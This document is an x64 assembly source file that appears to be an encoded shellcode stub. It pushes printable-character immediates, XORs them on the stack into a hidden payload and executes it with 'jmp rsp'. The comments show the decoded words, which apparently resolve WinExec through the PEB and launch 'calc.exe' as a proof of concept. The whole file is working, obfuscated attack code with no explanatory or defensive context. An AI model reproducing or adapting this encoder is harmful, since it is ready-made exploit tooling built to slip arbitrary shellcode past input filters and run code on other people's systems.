; x64 encoded shellcodesection .text

global _start
_start:
    push rax
    push rcx
    push rdx
    push rbx
    push rsi
    push rdi
register:
    push 0x31323334
    pop rax
    sub rax, 0x31323335
    push rax
    xor al, 0x2f
    push rax
    pop rsi
    pop rcx
    push rcx
    xor [rsp + rsi + 0x30], ecx
    pop rdx
    push rcx
    xor [rsp + rsi + 0x34], ecx
    pop rdi
    push rsp
    pop rbx
encode:
; push 0xC358599090909090
    push rdi
    pop rax
    xor rax, 0x2c3e4d59
    xor rax, 0x43512236
    push rax
    push 0x7e6a2d56
    pop rax
    xor rax, 0x42327439
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x37], cl
; push 0x5A5B5E5FE38B4858
    push 0x39586b77
    pop rax
    xor rax, 0x252c232f
    push rax
    xor [rsp + rsi + 0x32], cx
    push 0x3c382377
    pop rax
    xor rax, 0x66637d28
    xor [rsp + rsi + 0x34], eax
; push 0x5B595A5E58415941
    push 0x32292d74
    pop rax
    xor rax, 0x6a687435
    push rax
    push 0x763e3139
    pop rax
    xor rax, 0x2d676b67
    xor [rsp + rsi + 0x34], eax
; push 0x5A415B415C419DD4
    push 0x2c285458
    pop rax
    xor rax, 0x70693673
    push rax
    xor [rsp + rsi + 0x30], cx
    push 0x6c3d2e3d
    pop rax
    xor rax, 0x367c757c
    xor [rsp + rsi + 0x34], eax
; push 0xFF4120EC8348C2FF
    push rdi
    pop rax
    xor rax, 0x53384152
    xor rax, 0x2f707c52
    push rax
    xor [rsp + rsi + 0x32], cl
    push 0x6b746772
    pop rax
    xor rax, 0x6b354761
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x37], cl
; push 0x48E1894850657865
    push 0x6f4a5d33
    pop rax
    xor rax, 0x3f2f2556
    push rax
    push 0x784c5d2c
    pop rax
    xor rax, 0x30522b64
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cx
; push 0x2E636C6163B84852
    push 0x3e747c3c
    pop rax
    xor rax, 0x5d33346e
    push rax
    xor [rsp + rsi + 0x32], cl
    push 0x4a5f4e23
    pop rax
    xor rax, 0x643c2242
    xor [rsp + rsi + 0x34], eax
; push 0xD23148CC8949D901
    push 0x2130553b
    pop rax
    xor rax, 0x5779733a
    push rax
    xor [rsp + rsi + 0x31], cl
    xor [rsp + rsi + 0x33], cl
    push 0x47753553
    pop rax
    xor rax, 0x6a447d60
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x37], cl
; push 0x4C880C8B414A0C8B
    push 0x2c3e623a
    pop rax
    xor rax, 0x6d746e4e
    push rax
    xor [rsp + rsi + 0x30], cl
    push 0x2c484d36
    pop rax
    xor rax, 0x603f4142
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x36], cl
; push 0x4166D7753C3E6889
    push 0x68534444
    pop rax
    xor rax, 0x546d2c32
    push rax
    xor [rsp + rsi + 0x30], cl
    push 0x245a774c
    pop rax
    xor rax, 0x653c5f39
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cl
; push 0xFC8141F2EBC40141
    push rdx
    pop rax
    xor rax, 0x4e5a5624
    xor rax, 0x5a615765
    push rax
    xor [rsp + rsi + 0x32], cx
    push 0x6c323378
    pop rax
    xor rax, 0x6f4c7275
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cl
; push 0x11CCC1410974C084
    push 0x61356b2d
    pop rax
    xor rax, 0x68415456
    push rax
    xor [rsp + rsi + 0x30], cx
    push 0x3542653d
    pop rax
    xor rax, 0x24715b7c
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cx
; push 0xACE4314DC03148DE
    push 0x7253796b
    pop rax
    xor rax, 0x4d62314a
    push rax
    xor [rsp + rsi + 0x30], cl
    xor [rsp + rsi + 0x33], cl
    push 0x66307b2d
    pop rax
    xor rax, 0x352b4a60
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x36], cx
; push 0x014C89348B41C9FF
    push rdi
    pop rax
    xor rax, 0x2e79572d
    xor rax, 0x5a38612d
    push rax
    xor [rsp + rsi + 0x32], cl
    push 0x543a3f65
    pop rax
    xor rax, 0x55764951
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cl
; push 0x51E367F63148144A
    push 0x7b2d6974
    pop rax
    xor rax, 0x4a657d3e
    push rax
    push 0x7d6d5c7d
    pop rax
    xor rax, 0x2c713b74
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x36], cl
; push 0x8BC93148DA014D24
    push 0x4c492673
    pop rax
    xor rax, 0x69486b57
    push rax
    xor [rsp + rsi + 0x33], cl
    push 0x364f7322
    pop rax
    xor rax, 0x4279426a
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x36], cx
; push 0x528B44D2314DD901
    push 0x722b4a70
    pop rax
    xor rax, 0x43666c71
    push rax
    xor [rsp + rsi + 0x31], cl
    push 0x735d3a75
    pop rax
    xor rax, 0x21297e58
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x36], cl
; push 0x4D204A8B44C9314D
    push 0x28485738
    pop rax
    xor rax, 0x6c7e6675
    push rax
    xor [rsp + rsi + 0x32], cl
    push 0x6e746721
    pop rax
    xor rax, 0x23542d55
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
; push 0xD8014D1C428B44C0
    push 0x29213d54
    pop rax
    xor rax, 0x6b55796b
    push rax
    xor [rsp + rsi + 0x30], cl
    xor [rsp + rsi + 0x32], cl
    push 0x5654216c
    pop rax
    xor rax, 0x71556c70
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x37], cl
; push 0x314DDA014C0B148B
    push 0x3b455157
    pop rax
    xor rax, 0x774e4523
    push rax
    xor [rsp + rsi + 0x30], cl
    push 0x73727a74
    pop rax
    xor rax, 0x423f5f75
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cl
; push 0x88B1C93148DB014C
    push rdx
    pop rax
    xor rax, 0x7a6c7a79
    xor rax, 0x32487b35
    push rax
    xor [rsp + rsi + 0x32], cl
    push 0x4e3d6755
    pop rax
    xor rax, 0x39735164
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
; push 0x3C5B8BDB8949205B
    push 0x41337d3b
    pop rax
    xor rax, 0x377a5d60
    push rax
    xor [rsp + rsi + 0x33], cl
    push 0x5671324a
    pop rax
    xor rax, 0x6a2a466e
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cx
; push 0x8B481B8B481B8B48
    push 0x224a4d3a
    pop rax
    xor rax, 0x6a513972
    push rax
    xor [rsp + rsi + 0x31], cl
    push 0x2e366336
    pop rax
    xor rax, 0x5a7e7842
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x34], cl
    xor [rsp + rsi + 0x37], cl
; push 0x205B8B48185B8B48
    push 0x6c3d523f
    pop rax
    xor rax, 0x74662677
    push rax
    xor [rsp + rsi + 0x31], cl
    push 0x6d7e2471
    pop rax
    xor rax, 0x4d255039
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cl
; push 0x605B8B4865DB3148
    push 0x49447e74
    pop rax
    xor rax, 0x2c604f3c
    push rax
    xor [rsp + rsi + 0x32], cl
    push 0x2772532e
    pop rax
    xor rax, 0x47292766
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x35], cl
; push 0x9C54415341524151
    push 0x2d316628
    pop rax
    xor rax, 0x6c632779
    push rax
    push 0x502e3369
    pop rax
    xor rax, 0x337a723a
    xor [rsp + rsi + 0x34], eax
    xor [rsp + rsi + 0x37], cl
; push 0x4150415652515350
    push 0x232b3336
    pop rax
    xor rax, 0x717a6066
    push rax
    push 0x3c217731
    pop rax
    xor rax, 0x7d713667
    xor [rsp + rsi + 0x34], eax
; jmp to shellcode
to_shellcode:
    jmp rsp
